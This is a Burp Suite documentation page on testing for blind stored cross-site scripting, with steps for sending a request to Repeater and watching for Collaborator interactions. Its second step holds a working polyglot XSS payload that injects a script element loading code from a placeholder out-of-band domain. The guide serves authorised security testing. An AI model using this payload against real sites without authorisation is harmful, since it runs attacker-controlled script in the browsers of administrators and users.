> Source: https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/input-validation/xss/testing-for-blind-xss

Professional

# Testing for blind XSS

-

**Last updated: ** September 3, 2026
-

**Read time: ** 1 Minute

 Blind cross-site scripting (XSS) is a type of stored XSS in which the data exit point is not accessible to the attacker, for example due to a lack of privileges.


 To test for blind XSS vulnerabilities, you can use Burp Suite to inject an XSS payload that may trigger an out-of-band interaction with the Burp Collaborator server.
 Burp monitors the Collaborator server to identify whether an out-of-band interaction occurs. This indicates that the attack was successful.


## Steps

 To test for blind XSS with Burp Suite:


1.
 Right-click the request you want to investigate and select **Send to Repeater**.

1.
 In the **Repeater** tab, change a parameter's value to a proof-of-concept payload. As you don't know which characters may be filtered or encoded, use a payload that works in most contexts, such as:
 `</script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source), s.stack=Error().stack, s.src=(/,/+/yourcollaboratordomain/).slice(2), document.documentElement.appendChild(s))//'>`
1.
 Right-click the appropriate place in the proof-of-concept payload to insert a Collaborator domain and select **Insert Collaborator payload**. For example, replace `yourcollaboratordomain` with the Collaborator domain.

1.
 Click **Send**.


The command may be executed after a delay, for example when an administrator eventually views the page that contains the stored payload.
 The **Collaborator** tab flashes when an interaction occurs. You should return to the project file and check the **Collaborator** tab to identify any delayed interactions.

#### Related pages

- [Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
- [Blog post: Hunting asynchronous vulnerabilities](https://portswigger.net/research/hunting-asynchronous-vulnerabilities)
